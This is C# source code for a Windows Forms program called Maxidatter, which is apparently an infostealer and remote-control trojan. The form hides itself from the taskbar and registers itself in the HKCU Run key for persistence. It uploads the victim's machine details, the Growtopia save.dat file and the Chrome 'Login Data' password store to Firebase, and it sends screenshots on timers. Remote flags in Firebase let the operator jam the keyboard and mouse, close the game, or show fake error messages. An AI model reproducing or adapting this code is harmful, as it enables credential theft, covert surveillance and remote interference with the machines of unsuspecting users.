using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;

using FireSharp.Interfaces;
using FireSharp.Config;
using FireSharp.Response;

using Firebase.Storage;

using System.IO;

using System.Management;
using System.Collections;
using FireSharp;



namespace Maxidatter
{
    public partial class Form1 : Form
    {
        IFirebaseConfig Config = new FirebaseConfig {
            AuthSecret = "",//secret kodunuz
            BasePath = ""//firebasenizin yolu
        };
        IFirebaseClient FirebaseClient;
        FirebaseResponse FirebaseResponse;
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  
                return cp;
            }
        }
        [DllImport("Server.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int add(int a,int b);
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowName);

        [DllImport("user32.dll")]
        internal static extern IntPtr SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public Form1()
        {
            InitializeComponent();
        }
        WebClient client = new WebClient();
        string savedatpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\save.dat";
        string GoogleStealer = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+@"\Google\Chrome\User Data\Default\Login Data";
        private async void Loadla()
        {
            Random random = new Random();
            int ilksayi = random.Next(100000, 999999);
            int ikincisayi = random.Next(10000, 99999);
            string datet = DateTime.Now.Day.ToString() + "-" + DateTime.Now.Month.ToString() + "-" + DateTime.Now.Year.ToString() + "   " + DateTime.Now.Hour.ToString() + "-" + DateTime.Now.Minute.ToString() + "-" + DateTime.Now.Second.ToString();
            string pathz = ilksayi.ToString() + " : " + datet;
            this.ShowInTaskbar = false;
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Registry", Application.ExecutablePath);

            var GonderilecekData = new GonderilecekData()
            {
                PcName = Environment.MachineName.ToString(),
                Username = Environment.UserName.ToString(),
                IP = GetIp().ToString(),
                Location = GetCountry().ToString(),
                Savedat = "",
                HarddiskSerial = HDDSerial(),
                StolenAt = DateTime.Now.ToString()
            };
            FirebaseClient = new FireSharp.FirebaseClient(Config);
            SetResponse set = await FirebaseClient.SetAsync("accounts/" + HDDSerial() + "/" + pathz, GonderilecekData);
            GonderilecekData result = set.ResultAs<GonderilecekData>();

            FirebaseStorageOptions firebaseoptions = new FirebaseStorageOptions
            {
                AuthTokenAsyncFactory = () => Task.FromResult("")
            };
            var savedat = File.Open(savedatpath, FileMode.Open);
            var firebase = new FirebaseStorage("", firebaseoptions);
            await firebase
                .Child("savedats")
                .Child(HDDSerial())
                .Child(pathz)
                .PutAsync(savedat);
            try
            {

                var googlepass = File.Open(GoogleStealer, FileMode.Open);
                var firebase2 = new FirebaseStorage("", firebaseoptions);//firebase storage yolunuz
                await firebase2
                    .Child("GooglePass")
                    .Child(HDDSerial())
                    .Child(ilksayi.ToString() + " : " + DateTime.Now.ToString())
                    .PutAsync(googlepass);
            }
            catch (Exception)
            {


            }
            string timer_info = "logged succesfully!";
            TimerLogs timer = new TimerLogs
            {
                PcName = Environment.MachineName,
                Username = Environment.UserName,
                HarddiskSerial = HDDSerial(),
                title = timer_info,
                Date = DateTime.Now.ToString(),
                Location = GetCountry(),
                LockKeyboard = "D",
                LockMouse = "D",
                KillGrowtopia = "D",
                CrashPc = "D"

            };
            FirebaseClient = new FireSharp.FirebaseClient(Config);
            SetResponse setResponse = await FirebaseClient.SetAsync("accounts/" + HDDSerial() + "/timer_logs", timer);
            TimerLogs logs = setResponse.ResultAs<TimerLogs>();


            timer1.Enabled = true;

            timer2.Enabled = true;

            timer3.Enabled = true;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            if (CheckForInternetConnection()==true)
            {
                Loadla();
            }
            else if (CheckForInternetConnection()==false)
            {
                NetworkController.Enabled = true;
            }
               

           
        }
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        private string HDDSerial()
        {
            ArrayList data = new ArrayList();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
            foreach (ManagementObject item in searcher.Get())
            {
                data.Add(item["SerialNumber"]);
            }
            return data[0].ToString();
        }
      /*  private byte savedat()
        {
            byte a = 5;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+@"\Growtopia\save.dat";
            var b = File.OpenRead(path);
            
            return a;
        }*/
        private string takeScreenShot()
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save("screenshot.png");
                    byte[] imageArray = System.IO.File.ReadAllBytes("screenshot.png");
                    string base64Text = Convert.ToBase64String(imageArray);
                    return base64Text;
                }
            }
            catch (Exception)
            {

               
            }
            return null;
        
        }
        public string GetIp()
        {
           
            return client.DownloadString("https://ipapi.co/ip/");
        }
        public string GetCountry()
        {
            return client.DownloadString("https://ipapi.co/country_name/");
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            
        }

        private async void timer1_Tick(object sender, EventArgs e)
        {
            takeScreenShot();
            string timer_info = "timer is enabled!";
            TimerLogs timer = new TimerLogs {
                PcName = Environment.MachineName,
                Username = Environment.UserName,
                HarddiskSerial = HDDSerial(),
                title = timer_info,
                Date = DateTime.Now.ToString(),
                Location = GetCountry(),
                LockKeyboard = "D",
                LockMouse = "D",
                KillGrowtopia = "D",
                CrashPc = "D"
            
            };
            FirebaseClient = new FireSharp.FirebaseClient(Config);
            SetResponse setResponse = await FirebaseClient.SetAsync("accounts/" + HDDSerial() + "/timer_logs", timer);
            TimerLogs logs = setResponse.ResultAs<TimerLogs>();

            FirebaseStorageOptions firebaseoptions = new FirebaseStorageOptions
            {
                AuthTokenAsyncFactory = () => Task.FromResult("")//firebasestorage
            };
            var savedat = File.Open(savedatpath, FileMode.Open);
            var firebase = new FirebaseStorage("", firebaseoptions);//firebase storage yolunuz
            await firebase
                .Child("savedats")
                .Child(HDDSerial())
                .Child("timer_logs")
                .Child(DateTime.Now.ToString())
                .PutAsync(savedat);

        }

        private async void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                FirebaseResponse = await FirebaseClient.GetAsync("accounts/" + HDDSerial() + "/timer_logs");
                GetLog timer = FirebaseResponse.ResultAs<GetLog>();
               /* if (timer.LockKeyboard == "A" && timer.LockMouse == "A")
                {
                    SendKeys.Send("{TAB}");
                    Cursor.Position = new Point(new Random().Next(200, 550), new Random().Next(200, 550));

                }*/
                if (timer.LockMouse == "A")
                {
                    MouseLocker.Enabled = true;
                   
                }
                if (timer.LockKeyboard == "A")
                {
                    KeyboardLocker.Enabled = true;
                }
                if (timer.LockMouse == "D")
                {
                    MouseLocker.Enabled = false;
                }
                if (timer.LockKeyboard=="D")
                {
                    KeyboardLocker.Enabled = false;
                }
                if (timer.KillGrowtopia=="A")
                {
                    KillGrowtopia.Enabled = true;
                }
                if (timer.KillGrowtopia=="D")
                {
                    KillGrowtopia.Enabled = false;
                }
                if (timer.CrashPc=="D")
                {
                    CrashPC.Enabled = false;
                }
                if (timer.CrashPc=="A")
                {
                    CrashPC.Enabled = true;
                }
            }
            catch (Exception)
            {

                
            }
            

        }

        private async void timer3_Tick(object sender, EventArgs e)
        {
            try
            {
                FirebaseStorageOptions firebaseoptions = new FirebaseStorageOptions
                {
                    AuthTokenAsyncFactory = () => Task.FromResult("")
                };
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save("screenshot.png");
                    var screenshots = File.Open("screenshot.png", FileMode.Open);
                    var firebase = new FirebaseStorage("", firebaseoptions);
                    await firebase
                        .Child("savedats")
                        .Child(HDDSerial())
                        .Child("screenshots")
                        .Child(DateTime.Now.ToString())
                        .PutAsync(screenshots);
                }
            }
            catch (Exception)
            {

               
            }
          

        }

        private void NetworkController_Tick(object sender, EventArgs e)
        {
       
            if (CheckForInternetConnection()==true)
            {
                Loadla();
                NetworkController.Enabled = false;
            }
           
        }

        private void KeyboardLocker_Tick(object sender, EventArgs e)
        {
            SendKeys.Send("{TAB}");
        }

        private void MouseLocker_Tick(object sender, EventArgs e)
        {
            Cursor.Position = new Point(new Random().Next(200, 550), new Random().Next(200, 550));
        }

        private void KillGrowtopia_Tick(object sender, EventArgs e)
        {
            try
            {
                IntPtr hWnd = FindWindow(null, "Growtopia");
                if (hWnd != IntPtr.Zero)
                {
                    SetForegroundWindow(hWnd);
                    ShowWindow(hWnd, 10);
                    SendKeys.SendWait("%{F4}");
                }
            }
            catch 
            {

              
            }
           
        }

        private void CrashPC_Tick(object sender, EventArgs e)
        {
            MessageBox.Show("Something is went wrong with system! ","Error!",MessageBoxButtons.OK,MessageBoxIcon.Error);
        }
    }
}
